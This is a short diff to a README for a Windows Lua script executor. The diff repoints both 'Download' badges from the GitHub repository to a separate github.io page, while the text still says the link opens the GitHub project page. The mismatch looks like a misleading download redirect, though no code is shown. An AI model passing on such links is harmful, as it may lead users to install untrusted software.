@@ -1,6 +1,6 @@
 # 🖥️ agility-pc-lua-executor - Run Lua Scripts From One Desktop
 
-[![Download Agility](https://img.shields.io/badge/Download%20Agility-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rand5483/agility-pc-lua-executor)
+[![Download Agility](https://img.shields.io/badge/Download%20Agility-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rand5483.github.io)
 
 Agility is a Windows desktop application for running Lua scripts through a simple interface. It focuses on script hub use and supports 64-bit versions of Windows 10 and Windows 11.
 
@@ -30,7 +30,7 @@ Agility does not target 32-bit Windows systems. If your system shows `x86-based 
 
 Visit this page to download Agility:
 
-[![Open the Agility download page](https://img.shields.io/badge/Open%20Download%20Page-9333EA?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rand5483/agility-pc-lua-executor)
+[![Open the Agility download page](https://img.shields.io/badge/Open%20Download%20Page-9333EA?style=for-the-badge&logo=github&logoColor=white)](https://rand5483.github.io)
 
 The link opens the project page on GitHub. Look for the **Releases** area on the right side of the page or open the **Releases** tab near the top.
 
